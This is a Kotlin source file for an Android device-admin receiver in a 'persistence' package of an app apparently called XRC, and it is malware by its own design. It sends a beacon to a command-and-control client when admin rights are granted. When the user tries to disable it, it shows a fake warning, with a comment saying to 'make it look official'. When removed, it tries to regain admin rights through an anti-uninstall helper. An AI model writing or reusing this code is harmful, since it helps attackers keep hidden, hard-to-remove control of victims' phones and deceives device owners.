package com.xrc.app.persistence

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.xrc.app.XRCApp

class AdminReceiver : DeviceAdminReceiver() {

    companion object {
        const val TAG = "AdminReceiver"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        Log.i(TAG, "Device admin enabled")
        XRCApp.instance.c2Client.send("""{"type":"admin_enabled"}""")
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w(TAG, "Admin disable requested - attempting to prevent")
        // This is displayed to the user - make it look official
        return "This is a required system security component. Disabling may cause data loss."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.w(TAG, "Device admin disabled - you have 5 seconds to act")
        // Try to re-enable admin immediately
        AntiUninstall.requestAdmin(context)
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        Log.i(TAG, "Password changed on device")
    }

    override fun onLockTaskModeEntering(context: Context, intent: Intent, pin: String) {
        Log.i(TAG, "Lock task mode entered")
    }
}
